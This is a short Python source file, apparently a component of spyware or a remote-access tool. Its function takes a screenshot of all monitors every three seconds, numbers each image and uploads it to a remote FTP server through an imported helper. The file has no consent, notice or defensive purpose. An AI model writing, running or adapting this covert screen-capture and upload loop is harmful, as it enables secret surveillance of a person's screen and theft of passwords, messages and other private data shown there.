from network.ftpconn import upload_to_ftp
from  mss import mss
import threading

val = 0
screen = mss()


def collectimage():
    screen.shot(mon=-1, output=('screen.png'))
    global val
    val += 1
    filename = 'screen'+ str(val) + '.png'
    upload_to_ftp('screen.png',filename,'rb')
    threading.Timer(3,collectimage).start()  

            
    